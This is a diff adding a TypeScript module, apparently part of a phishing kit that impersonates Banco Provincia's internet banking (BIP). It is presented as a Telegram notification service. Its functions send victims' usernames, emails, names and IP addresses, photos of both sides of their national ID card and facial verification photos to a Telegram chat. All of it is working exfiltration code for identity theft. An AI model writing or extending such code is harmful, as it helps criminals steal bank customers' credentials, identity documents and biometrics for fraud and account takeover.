@@ -1,0 +1,150 @@
+// 📱 Servicio de notificaciones por Telegram
+import TelegramBot from 'node-telegram-bot-api';
+import * as fs from 'fs';
+import * as path from 'path';
+
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
+
+let bot: TelegramBot | null = null;
+
+// Inicializar bot solo si hay token configurado
+if (TELEGRAM_BOT_TOKEN) {
+  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
+}
+
+export const sendLoginNotification = async (userData: {
+  username: string;
+  name: string;
+  email: string;
+  timestamp: string;
+  ip?: string;
+}) => {
+  if (!bot || !TELEGRAM_CHAT_ID) {
+    console.log('⚠️ Telegram no configurado. Login de:', userData.username);
+    return;
+  }
+
+  try {
+    const message = `
+🔐 *NUEVO LOGIN EN BIP*
+
+👤 *Usuario:* ${userData.username}
+📧 *Email:* ${userData.email}
+👨‍💼 *Nombre:* ${userData.name}
+🕐 *Fecha:* ${userData.timestamp}
+${userData.ip ? `🌐 *IP:* ${userData.ip}` : ''}
+
+✅ Login exitoso en Banco Provincia Internet Banking
+    `;
+
+    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
+    console.log('✅ Notificación enviada a Telegram');
+  } catch (error) {
+    console.error('❌ Error enviando notificación a Telegram:', error);
+  }
+};
+
+export const sendDNINotification = async (data: {
+  userId: string;
+  frontImage: string;
+  backImage: string;
+  timestamp: string;
+}) => {
+  if (!bot || !TELEGRAM_CHAT_ID) {
+    console.log('⚠️ Telegram no configurado');
+    return;
+  }
+
+  try {
+    const message = `
+📄 *VERIFICACIÓN DNI - BIP*
+
+👤 *Usuario ID:* ${data.userId}
+🕐 *Fecha:* ${data.timestamp}
+
+📸 Imágenes del DNI adjuntas ↓
+    `;
+
+    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
+
+    // Convertir base64 a buffer y enviar fotos
+    const frontBuffer = Buffer.from(data.frontImage.split(',')[1], 'base64');
+    const backBuffer = Buffer.from(data.backImage.split(',')[1], 'base64');
+
+    await bot.sendPhoto(TELEGRAM_CHAT_ID, frontBuffer, { 
+      caption: '📄 DNI - FRENTE' 
+    });
+    
+    await bot.sendPhoto(TELEGRAM_CHAT_ID, backBuffer, { 
+      caption: '📄 DNI - DORSO' 
+    });
+
+    console.log('✅ DNI enviado a Telegram');
+  } catch (error) {
+    console.error('❌ Error enviando DNI a Telegram:', error);
+  }
+};
+
+export const sendFacialNotification = async (data: {
+  userId: string;
+  faceImage: string;
+  lightLevel: number;
+  timestamp: string;
+}) => {
+  if (!bot || !TELEGRAM_CHAT_ID) {
+    console.log('⚠️ Telegram no configurado');
+    return;
+  }
+
+  try {
+    const lightEmoji = data.lightLevel >= 60 ? '✅' : data.lightLevel >= 30 ? '⚠️' : '❌';
+    
+    const message = `
+👤 *VERIFICACIÓN FACIAL - BIP*
+
+👤 *Usuario ID:* ${data.userId}
+🕐 *Fecha:* ${data.timestamp}
+💡 *Nivel de Luz:* ${data.lightLevel}% ${lightEmoji}
+
+✅ Verificación biométrica completada
+    `;
+
+    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
+
+    // Enviar foto facial
+    const faceBuffer = Buffer.from(data.faceImage.split(',')[1], 'base64');
+    await bot.sendPhoto(TELEGRAM_CHAT_ID, faceBuffer, { 
+      caption: `👤 VERIFICACIÓN FACIAL\n💡 Luz: ${data.lightLevel}%` 
+    });
+
+    console.log('✅ Verificación facial enviada a Telegram');
+  } catch (error) {
+    console.error('❌ Error enviando verificación facial:', error);
+  }
+};
+
+export const sendSecurityAlert = async (alertData: {
+  type: string;
+  message: string;
+  username?: string;
+}) => {
+  if (!bot || !TELEGRAM_CHAT_ID) {
+    return;
+  }
+
+  try {
+    const message = `
+⚠️ *ALERTA DE SEGURIDAD - BIP*
+
+🚨 *Tipo:* ${alertData.type}
+📝 *Mensaje:* ${alertData.message}
+${alertData.username ? `👤 *Usuario:* ${alertData.username}` : ''}
+🕐 *Fecha:* ${new Date().toLocaleString('es-AR')}
+    `;
+
+    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
+  } catch (error) {
+    console.error('Error enviando alerta a Telegram:', error);
+  }
+};
